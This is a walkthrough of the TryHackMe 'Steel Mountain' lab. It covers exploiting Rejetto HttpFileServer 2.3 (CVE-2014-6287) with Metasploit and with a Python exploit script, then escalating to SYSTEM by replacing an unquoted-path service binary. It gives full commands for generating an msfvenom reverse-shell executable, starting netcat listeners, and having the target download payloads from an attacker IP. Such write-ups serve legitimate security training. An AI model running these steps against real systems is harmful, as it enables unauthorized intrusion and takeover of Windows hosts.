# Steel mountain (with and without metasploit)

This is a Write up for the Steel Mountain machine form TryHackMe you can find the link and details about the room in the [README.md](https://github.com/mil0666/tryhackme-writeups/blob/main/README.md)
**FIY**: words that are marked *LIKE THIS* are commands that you can use in you terminal and no flags were disclosed in this write up! 


First what I like to do with any machine turn on nmap and gobuster and let them run in the background I have my nappy.sh and
First what I like to do with any machine turn on nmap and gobuster and let them run in the background I have my nappy.sh and

gobuddy-dir.sh "scripts"

nappy.sh - *nmap -sS -sV -A -O $IP*

gobuddy-dir.sh - *gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt*

I usually use seclists for this you can find them here - https://github.com/danielmiessler/SecLists


### INITIAL ACCESS

While our scans are going in the background we can take a look at our target through the browser


![image](https://user-images.githubusercontent.com/81188817/112178218-e466ec00-8bf9-11eb-812e-d30437a76bf7.png)



I tried to zoom in here to see if his name is written on the shirt but no luck,
My next try was going to View source for this page and there it was /img/BillHarper.png
So there we have our first answer.

1. Who is the employee of the month?

   **bill harper**


 2. Scan the machine with nmap. What is the other port running a web server on?

   Good thing we got the nmap scan already running so we know the answer to this is

    **8080**

![image](https://user-images.githubusercontent.com/81188817/112178397-fc3e7000-8bf9-11eb-8fa1-6a2df846e24d.png)


3. Take a look at the other web server. What file server is running?

    So in the screen shot above we can see it is a HttpFileServer 2.3
    but that is only the part of the server. If you don't see this HttpFileServer 2.3. hyperlinked below the Actions the first time you go to the link, feel free to click around     a bit or refresh the page and it will appear.
    When you actually click on it it will take you this link - http://www.rejetto.com/hfs/

    So with this we now have the whole answer:\

    **Rejetto file server**



4. What is the CVE number to exploit this file server?

    We can either use google (exploit-db) or searchsploit to find exploits for this HFS:
    You can just google CVE rejetto http file server and the firs exploit-db link I got is this:

    https://www.exploit-db.com/exploits/39161

    So the answer is:  **2014-6287**

The command for searchsploit is:
*searchsploit rejetto http file server*

Here we can see searchsploit results and we can see the **39161.py** that we will need for this machine a bit later, so you can just copy that python script to your working directory so you don't have to look for it later.

![image](https://user-images.githubusercontent.com/81188817/112178754-517a8180-8bfa-11eb-9385-edb25129e52f.png)


 *cp /usr/share/exploitdb/exploits/windows/remote/39161.py Desktop/thm/steelmountain/* - this will copy the python script.

 5. Use Metasploit to get an initial shell. What is the user flag?

     Okay we will first start metasploit by running msfconsole in our terminal
     There in the msfconsole you will use *search* command is msfconsole to find the exploit that we need:
     *search rejetto http file server* - we only got one exploit so we will go and use that one with the command *use 0*
     out default payload is windows/meterpreter/reverse_tcp which is what we need so we'll leave it as is

 ![image](https://user-images.githubusercontent.com/81188817/112179056-9f8f8500-8bfa-11eb-9691-d392c64a7f41.png)


 Then you'll type in *options* to see what we have to configure in order for this payload to work:



  ![image](https://user-images.githubusercontent.com/81188817/112179080-a61dfc80-8bfa-11eb-8ce2-2c91ff2648bf.png)

 ##### What we need to configure:

RHOST & RPORT  - These will be our target machine IP address and the port 8080

SRVHOST & SRVPORT - these will be your attacking machine IP address (usually tun0 interface, you can find this via *ip addr* command), and for the port you can put any port      that isn't already busy, but I would recommend a higher number port e.g. 4848

 Also you have to configure the two for the payload as well:
 LHOST & LPORT, there I configured the same IP address (our attacking machine, tun0) but a different port then what we configured for the the **SRVPORT**

 We use the prefix set e.g. *set LPORT 4848* for all the options.

 After we set up everything you can just type *run* or *exploit* and you should get a meterpreter shell.
 There we can use the *migrate* command to migrate to a more stable process so our session doesn't break in the middle of our priv esc :D

 ![image](https://user-images.githubusercontent.com/81188817/112179284-d8c7f500-8bfa-11eb-9fa3-08e537ff896c.png)

 To see the processes you can type *ps* and migrate using the process PID number, here I migrated to the explorer.exe process using its PID.

  After this we can go and fetch the user flag, first we have to locate it the logical path is to go to the Users desktop and search there:

![image](https://user-images.githubusercontent.com/81188817/112179337-e54c4d80-8bfa-11eb-8fa0-02937ce812b8.png)

 ### PRIVELEGDE ESCALATION WITH METASPLOIT:

First what we need to do is download the **PowerUp.ps1** script to our working directory on our attacking machine since this is what we will be using for our priv ecs on the    target machine.

 You can find the script here - https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

 When you use the *wget* command be sure that you click RAW for the script and then *wget* it like that to your machine
 The full command is:

  *wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1*

  Then on our meterpreter shell we use upload to get it onto the windows target machine so:
  *upload PowerUp.ps1*  (if this doesn't work use the full path to the file e.g. /home/user/Desktop/PowerUp.ps1)

  So now we have the script on Bills desktop.

  In order for us to use this powershell script we have to first prepare so we will type *load powershell* to load the powershell extension and than *powershell_shell* to get our shell
  so we can actually use the script * . .\PowerUp.ps1 * and after that Invoke-AllChecks
 It should look like this:

 ![image](https://user-images.githubusercontent.com/81188817/112180478-e16cfb00-8bfb-11eb-8f5f-8212bdff6a5d.png)


 Pay close attention to the **CanRestart** option that is set to true. What is the name of the name of the service which shows up as an _unquoted service path_ vulnerability?

 So basically the first service that appears: **AdvancedSystemCareService9** is the one that has CanRestart marked True and it is located under C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe

 We have the explanation in the room why the CanRestart is important:

 The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!

 Use msfvenom to generate a reverse shell as an Windows executable. The command I used was:

  *msfvenom -p windows/shell_reverse_tcp LHOST=10.14.7.187 LPORT=5556 -f exe -o ASCService.exe*

  -p is for payload and here we specify the payload that we wanna use

  LHOST and LPORT is the IP of your attacking machine and the port of your choosing

  -f is type of file, here we specified exe

  -o the output file, I named it the same as the exe of the service we want to copy over.

  So we'll go to our folder on the target machine where the exe file of the service is stored

  *cd C:/"Program Files (x86)"/IObit/"Advanced SystemCare"/*

  We have to put quotations because of the spaces, we can't cd without them into these folders.

  When we're there we will stop the ASCService.exe, but first type in *shell* to get a shell where we can actually stop the service since I haven't found a way to do this from  meterpreter:

  After you get the shell type:  *net stop AdvancedSystemCareService9*

 ![image](https://user-images.githubusercontent.com/81188817/112180605-fea1c980-8bfb-11eb-9c1e-7146c7afa6e2.png)


  Then we leave this shell so we can *upload* our payload through meterpreter and get back the shell. You do this with CTRL+C or *exit*
  And then upload the payload the same way we did with the PowerUp.ps1 script:

  ![image](https://user-images.githubusercontent.com/81188817/112180784-25600000-8bfc-11eb-9fb6-3039d8c46968.png)


  Before we start the service again make sure you have a nc listener on your attacking machine with the port you defined  while making the payload in msfvenom (LPORT option):
  In my case it's:

  *nc -lvnp 5556*

  And then go to the targer machine go ahead and type *shell* first and then start the service with

  *net start AdvancedSystemCareService9*

  And voilà you will get a reverse shell.

  When you type *whoami* you will se you are **nt authority\system** which is root for windows.

  From there you can go ahead to the Administrators desktop and look for the flag.

![image](https://user-images.githubusercontent.com/81188817/112180844-33ae1c00-8bfc-11eb-8be6-b8b8a18ab7f2.png)

### PRIVELEGDE ESCALATION WITHOUT METASPLOIT:

Remember the python script that I said you should save to your working directory cause we're gonna use it later, well later is now :D

If you didn't save it then no big deal you can just go to you directory and type:
*cp /usr/share/exploitdb/exploits/windows/remote/39161.py .* - this will copy the script to you current directory

And also we will download the ncat.exe from the link provided - https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe

When you download the exe file be sure to rename it to nc.exe because this is what the python script will recognize since it will upload this nc.exe to the target machine and use it for our revese shell (this information is within the script).

Renaming the exe file - *mv ncat.exe nc.exe*


**FIY**: you have to run it with just python 39616.py <IP address> <port>, python3 will give you an error if you try

Lets take a look at our python script:

![image](https://user-images.githubusercontent.com/81188817/112213471-6832cf80-8c1e-11eb-9705-b4bfa963559d.png)

Here we see three things that will make this script work as its supposed to

1. Usage : python Exploit.py <Target IP address> <Target Port Number>
2. You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe) and you may need to run it multiple times for success!
3. We have to set our local (tun0) IP address and the port that we will be listening on for the shell.

First let set up a simple http server on our local machine, **be sure that you type this command while you are in the directory where the nc.exe  file is**:

*sudo python3 -m http.server 80* - we have a web server running yay!

Now open another terminal and lets configure our nc listener with the port we configured in our python script.

*nc -lvnp 5553*

The first time we run, we will acutually be transfering the nc.exe that we downloaded earlier and you should get 200 response on your web server:

![image](https://user-images.githubusercontent.com/81188817/112213525-75e85500-8c1e-11eb-91ce-379089084445.png)


And the second time we run the script we will get a shell.

![image](https://user-images.githubusercontent.com/81188817/112220256-56552a80-8c26-11eb-8bef-25fa4830f02c.png)


Now we can go to bills Desktop and pull winPEAS (if you need to find out if the system is x64 or x86 you can use this command - *wmic os get osarchitecture* )

So our system is x64 we can use winPEASx64.exe that we can download from here - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe

And again pull it over from our web server so make sure you download this exe file in the same folder where your nc.exe is :)

Then on our windows machine type:
*powershell -c wget "http://10.14.7.187/winPEASx64.exe" -outfile winPEASx64.exe*

This will download the winPEASx64.exe to our windows machine and you can run it with just *winPEASx64.exe*

Yellow and red marked are the stuff that you should pay attention to.

So I tried winPEASx64 as well as winPEASany.exe, but wasn't able to find anything, the x64 just stops at one point and doesn't execute I left it for 30 minutes nothing, then the ANY looked promising but then the same thing happens just at a different point.

I'll definitely try it a couple of times and update if I get a different result.

What powershell -c command could we run to manually find out the service name? With a bit of googling the Powershell commands you will find the answer to be:

  **powershell -c "Get-Service"**
  
  ![image](https://user-images.githubusercontent.com/81188817/112220203-45a4b480-8c26-11eb-800a-29903766ab55.png)


##### EXPLOATATION:

So we will exploit the same service as we did in the previous priv esc with metaspoloit, but if you are doing this one right after the exploitation with metasploit I would recommend to restart the target machine so you can reupload the payload for the AdvancedSystemCareService9 service.

We will first go to the Advanced SystemCare folder with the command *cd C:\Program Files (x86)\IObit\Advanced SystemCare\* and there we will first stop the service with either net stop AdvancedSystemCareService9 or sc stop AdvancedSystemCareService9

Then copy our payload with the command we user earlier and start the service:

*powershell -c wget "http://10.14.7.187/ASCService.exe" -outfile ASCService.exe*

And  we have to use sc start, I tried with net start but it wasn't working and as soon as I went with sc like it was recommended I got the shell :)

And again we got nt authority\system and we can go and pick up the root.txt at C:\Users\Administrator\Desktop (to list files in a folder you can use *dir* and to look at a file equivalent to *cat* from Linux is *type*)

## HAPPY NOISES!

![image](https://user-images.githubusercontent.com/81188817/112220129-2efe5d80-8c26-11eb-8df7-ae719d6e1932.png)

